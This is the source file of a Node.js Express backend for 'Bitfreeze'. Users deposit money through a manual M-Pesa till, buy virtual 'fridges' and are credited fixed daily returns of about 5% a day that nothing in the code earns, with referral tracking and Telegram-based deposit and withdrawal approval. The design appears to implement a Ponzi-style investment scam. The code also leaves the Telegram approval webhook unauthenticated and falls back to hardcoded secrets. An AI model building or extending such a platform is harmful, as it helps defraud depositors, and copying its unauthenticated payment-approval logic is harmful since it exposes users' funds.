require('dotenv').config();
const express = require('express');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const bodyParser = require('body-parser');
const cors = require('cors');
const storage = require('node-persist');
const path = require('path');
const crypto = require('crypto');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT ? Number(process.env.PORT) : 3000;
const SECRET = process.env.BF_SECRET || 'bitfreeze_dev_secret';
const ADMIN_PASS = process.env.ADMIN_PASS || 'admin-pass';
const DOMAIN = process.env.DOMAIN || 'https://bitfreeze-production.up.railway.app';

// Telegram Bot
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// MPESA Manual
const MPESA_TILL = process.env.MPESA_TILL || '6992349';
const MPESA_NAME = process.env.MPESA_NAME || 'Bitfreeze';

// WhatsApp Channel
const WHATSAPP_CHANNEL = 'https://whatsapp.com/channel/0029VbBH6VX5PO10Jf9u1g04';

// Fridges catalog
const FRIDGES = [
  { id: '2ft', name: '2 ft Fridge', price: 500, dailyEarn: 25 },
  { id: '4ft', name: '4 ft Fridge', price: 1000, dailyEarn: 55 },
  { id: '6ft', name: '6 ft Fridge', price: 2000, dailyEarn: 100 },
  { id: '8ft', name: '8 ft Fridge', price: 4000, dailyEarn: 150 },
  { id: '10ft', name: '10 ft Fridge', price: 6000, dailyEarn: 250 },
  { id: '12ft', name: '12 ft Fridge', price: 8000, dailyEarn: 350 },
];

app.use(bodyParser.json());
app.use(cors({ origin: DOMAIN }));
app.use(express.static(path.join(__dirname, 'public')));

// Initialize storage
(async () => {
  await storage.init({ dir: path.join(__dirname, 'persist'), forgiveParseErrors: true });
  if (!await storage.getItem('users')) await storage.setItem('users', []);
  if (!await storage.getItem('deposits')) await storage.setItem('deposits', []);
  if (!await storage.getItem('withdrawals')) await storage.setItem('withdrawals', []);
  console.log('Storage initialized.');
})();

// Helpers
async function getUsers() { return (await storage.getItem('users')) || []; }
async function saveUsers(u) { await storage.setItem('users', u); }
async function findUser(email) { return (await getUsers()).find(x => x.email === email); }
async function saveUser(user) {
  const u = await getUsers();
  const i = u.findIndex(x => x.email === user.email);
  if (i > -1) u[i] = user; else u.push(user);
  await saveUsers(u);
}

// Auth middleware
function auth(req, res, next) {
  const a = req.headers.authorization;
  if (!a || !a.startsWith('Bearer ')) return res.status(401).json({ error: 'Unauthorized' });
  try { req.user = jwt.verify(a.slice(7), SECRET); next(); } 
  catch { return res.status(401).json({ error: 'Invalid token' }); }
}

// Telegram helper
async function tgSend(text, buttons) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  const body = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' };
  if (buttons) body.reply_markup = { inline_keyboard: buttons };
  await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, body)
    .catch(e => console.error('TG send error', e.message));
}

// ========== API ==========

// Register
app.post('/api/register', async (req, res) => {
  const { email, password, phone, ref } = req.body || {};
  if (!email || !password) return res.status(400).json({ error: 'Email & password required' });
  const users = await getUsers();
  if (users.find(u => u.email === email)) return res.status(400).json({ error: 'User exists' });
  const hashed = await bcrypt.hash(password, 10);
  const user = { email, password: hashed, phone: phone || null, balance: 0, fridges: [], referrals: [], createdAt: Date.now(), lastDaily: Date.now() };
  users.push(user); await saveUsers(users);

  if (ref) {
    const inv = users.find(u => u.email === String(ref));
    if (inv) { inv.referrals.push({ email, createdAt: Date.now() }); await saveUsers(users); }
  }

  res.json({ message: 'Registered', email, whatsapp: WHATSAPP_CHANNEL });
});

// Login
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body || {};
  const user = await findUser(email); if (!user) return res.status(400).json({ error: 'Invalid credentials' });
  const ok = await bcrypt.compare(password, user.password); if (!ok) return res.status(400).json({ error: 'Invalid credentials' });
  const token = jwt.sign({ email: user.email }, SECRET, { expiresIn: '7d' });
  res.json({ token, email: user.email, phone: user.phone, balance: user.balance, whatsapp: WHATSAPP_CHANNEL });
});

// Deposit
app.post('/api/deposit', auth, async (req, res) => {
  const { amount, mpesaCode, phone } = req.body;
  if (!amount || !mpesaCode || !phone) return res.status(400).json({ error: 'amount, mpesaCode, phone required' });
  const u = await findUser(req.user.email); if (!u) return res.status(404).json({ error: 'User not found' });
  const deposits = (await storage.getItem('deposits')) || [];
  const d = { id: crypto.randomUUID(), email: u.email, phone, amount:Number(amount), mpesaCode, status:'PENDING', requestedAt:Date.now() };
  deposits.push(d); await storage.setItem('deposits', deposits);
  res.json({ message:'Deposit submitted' });

  const text = `🟢 <b>New Deposit Request</b>\nEmail: ${u.email}\nPhone: ${phone}\nAmount: KES ${amount}\nMPESA Code: <b>${mpesaCode}</b>\nDeposit ID: ${d.id}\nStatus: PENDING`;
  const buttons = [[
    { text:'✅ Approve', callback_data:`dep_approve_${d.id}` },
    { text:'❌ Reject', callback_data:`dep_reject_${d.id}` }
  ]];
  await tgSend(text, buttons);
});

// Withdraw
app.post('/api/withdraw', auth, async (req,res)=>{
  const { amount, phone } = req.body;
  if(!amount||!phone) return res.status(400).json({error:'amount & phone required'});
  const u = await findUser(req.user.email); if(!u) return res.status(404).json({error:'User not found'});
  if(u.balance < Number(amount)) return res.status(400).json({error:'Insufficient balance'});

  const withdrawals = (await storage.getItem('withdrawals'))||[];
  const w = { id: crypto.randomUUID(), email: u.email, phone, amount:Number(amount), status:'PENDING', requestedAt:Date.now() };
  withdrawals.push(w); await storage.setItem('withdrawals', withdrawals);
  res.json({message:'Withdrawal submitted'});

  const text = `🔵 <b>New Withdrawal Request</b>\nEmail: ${u.email}\nPhone: ${phone}\nAmount: KES ${amount}\nBalance: KES ${u.balance}\nWithdraw ID: ${w.id}\nStatus: PENDING`;
  const buttons = [[
    { text:'✅ Approve', callback_data:`wd_approve_${w.id}` },
    { text:'❌ Reject', callback_data:`wd_reject_${w.id}` }
  ]];
  await tgSend(text, buttons);
});

// Telegram callback for approve/reject
app.post('/api/telegram/webhook', async (req,res)=>{
  const cb = req.body.callback_query; if(!cb) return res.sendStatus(200);
  const data = cb.data||'';
  const answer = async (text)=> axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, { callback_query_id: cb.id, text }).catch(()=>{});

  if(data.startsWith('dep_')){
    const [_, action, id] = data.split('_');
    const deposits = (await storage.getItem('deposits'))||[];
    const d = deposits.find(x=>x.id===id); if(!d||d.status!=='PENDING'){ await answer('Already processed'); return res.sendStatus(200); }
    if(action==='approve'){ d.status='APPROVED'; const u=await findUser(d.email); if(u){ u.balance+=Number(d.amount); await saveUser(u); } }
    else d.status='REJECTED';
    d.processedAt=Date.now(); await storage.setItem('deposits', deposits);
    await answer(`Deposit ${d.status}`);
  }

  if(data.startsWith('wd_')){
    const [_, action, id] = data.split('_');
    const withdrawals = (await storage.getItem('withdrawals'))||[];
    const w = withdrawals.find(x=>x.id===id); if(!w||w.status!=='PENDING'){ await answer('Already processed'); return res.sendStatus(200);}
    if(action==='approve'){ w.status='APPROVED'; const u=await findUser(w.email); if(u){ u.balance-=Number(w.amount); await saveUser(u);} }
    else w.status='REJECTED';
    w.processedAt=Date.now(); await storage.setItem('withdrawals', withdrawals);
    await answer(`Withdrawal ${w.status}`);
  }

  res.sendStatus(200);
});

// Buy fridge
app.post('/api/buy', auth, async (req,res)=>{
  const { fridgeId } = req.body; if(!fridgeId) return res.status(400).json({error:'fridgeId required'});
  const item = FRIDGES.find(f=>f.id===fridgeId); if(!item) return res.status(400).json({error:'Invalid fridge'});
  const u = await findUser(req.user.email); if(!u) return res.status(404).json({error:'User not found'});
  if(u.balance<item.price) return res.status(400).json({error:'Insufficient balance'});
  u.balance-=item.price; u.fridges.push({id:item.id,name:item.name,price:item.price,boughtAt:Date.now()}); await saveUser(u);
  res.json({message:'Bought '+item.name, balance:u.balance});
});

// Daily earnings cron (runs every 24hrs)
setInterval(async ()=>{
  const users = await getUsers();
  const now = Date.now();
  for(const u of users){
    let totalEarn = 0;
    for(const f of u.fridges){
      const fridge = FRIDGES.find(fr=>fr.id===f.id);
      if(fridge && now - (f.lastEarn || 0) >= 24*60*60*1000){
        totalEarn += fridge.dailyEarn;
        f.lastEarn = now;
      }
    }
    if(totalEarn>0){ u.balance += totalEarn; await saveUser(u); }
  }
}, 60*60*1000); // checks hourly

// Status
app.get('/api/status',(req,res)=>res.json({status:'ok', time:Date.now(), till:MPESA_TILL, name:MPESA_NAME, whatsapp: WHATSAPP_CHANNEL}));

// Start server
app.listen(PORT,()=>console.log(`Bitfreeze running on ${PORT}`));
